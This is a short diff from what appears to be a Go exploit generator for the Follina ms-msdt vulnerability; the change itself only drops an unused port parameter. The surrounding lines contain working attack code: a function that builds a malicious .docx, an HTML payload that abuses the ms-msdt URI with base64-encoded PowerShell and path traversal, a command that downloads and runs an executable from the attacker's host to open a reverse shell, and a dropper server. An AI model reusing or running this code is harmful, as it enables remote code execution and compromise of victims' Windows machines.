@@ -18,7 +18,7 @@ func main() {
 	url, port := initArgs()
 	payload_url := "http://" + url + ":" + port
 	createMaliciousDocx(payload_url)
-	createPayload(payload_url, port)
+	createPayload(payload_url)
 	hostDropper(port)
 }
 
@@ -66,7 +66,7 @@ func addFilesToArchive(zipWriter *zip.Writer, basePath, baseZipPath string) {
 	}
 }
 
-func createPayload(payload_url, port string) {
+func createPayload(payload_url string) {
 	revshell_command := "Invoke-WebRequest " + payload_url + `/poop.exe -OutFile poop.exe; .\poop.exe`
 	base64_revshell_command := base64.StdEncoding.EncodeToString([]byte(revshell_command))
 	html_payload := `<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //` + generateRandomString(4096) + "\n</script>"
